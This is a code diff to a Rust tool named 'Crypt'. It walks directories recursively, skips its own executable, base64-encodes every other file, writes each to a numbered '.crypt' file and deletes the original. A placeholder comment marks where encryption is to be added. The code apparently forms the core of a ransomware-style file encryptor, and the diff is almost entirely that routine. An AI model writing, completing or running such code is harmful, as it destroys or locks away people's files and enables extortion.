@@ -1,10 +1,11 @@
 use std::env;
 use std::fs;
 use std::str;
-use std::io::Cursor;
+use std::io::{Cursor, Write};
 extern crate base64;
 extern crate clap;
 use clap::{Arg, App};
+use std::fs::OpenOptions;
 
 fn main() {
    let app = App::new("Crypt")
@@ -69,9 +70,8 @@ fn main() {
 
 fn enterDir(pathDir: String, inplace: bool, compress: bool, depth: i32) {
    let mut paths = fs::read_dir(pathDir.clone()).unwrap();
-
+   let mut fileIndex = 0;
    for path in paths {
-
       let mut fileName = path.as_ref().unwrap().clone().file_name().into_string().unwrap();
       let isFile = path.as_ref().unwrap().clone().file_type().unwrap().is_file();
       let isDir = path.as_ref().unwrap().clone().file_type().unwrap().is_dir();
@@ -81,8 +81,9 @@ fn enterDir(pathDir: String, inplace: bool, compress: bool, depth: i32) {
          path = format!("{}/{}", pathDir, fileName);
       }
 
-      if isFile {
-         encryptFile(path, fileName, inplace, compress);
+      if isFile && fileName != "Crypt.exe"{
+         fileIndex+=1;
+         encryptFile(path, fileName, inplace, compress, fileIndex);
       } else if isDir {
          println!("Entering Directory: {}", fileName);
          enterDir(path, inplace, compress, depth+1);
@@ -97,11 +98,11 @@ fn enterDir(pathDir: String, inplace: bool, compress: bool, depth: i32) {
    }
 }
 
-fn encryptFile(pathDir: String, fileName: String, inplace: bool, compress: bool) {
-   println!("Encrypting File: {}", pathDir);
+fn encryptFile(path: String, fileName: String, inplace: bool, compress: bool, fileIndex: i32) {
+   println!("Encrypting File: {}", path);
 
    // get buffer from file
-   let dataBuffer = fs::read(pathDir).unwrap();
+   let dataBuffer = fs::read(&path).unwrap();
 
    // convert to base64
    let mut b64data = base64::encode(dataBuffer);
@@ -109,5 +110,38 @@ fn encryptFile(pathDir: String, fileName: String, inplace: bool, compress: bool)
    // append filename to end
    b64data = format!("{},{}", b64data, fileName);
 
-   println!("{}", b64data)
+
+   /*
+      ENCRYPT HERE
+   */
+
+
+
+
+   // https://stackoverflow.com/questions/37157926/is-there-a-method-like-javascripts-substr-in-rust
+   trait StringUtils {
+      fn substring(&self, start: usize, len: usize) -> Self;
+   }
+
+   impl StringUtils for String {
+      fn substring(&self, start: usize, len: usize) -> Self {
+         self.chars().skip(start).take(len).collect()
+      }
+   }
+
+
+   // write encrypted contents to new file
+   let mut newFileName = String::new();
+
+   if path.rfind("/").unwrap_or(0) != 0 {
+     newFileName.push_str(&path.substring(0, (path.rfind("/").unwrap()+1)))
+   }
+
+   newFileName.push_str(&*(fileIndex.to_string() + ".crypt"));
+
+   fs::write(newFileName, &b64data);
+
+   // delete old file
+   fs::remove_file(path).unwrap();
+
 }
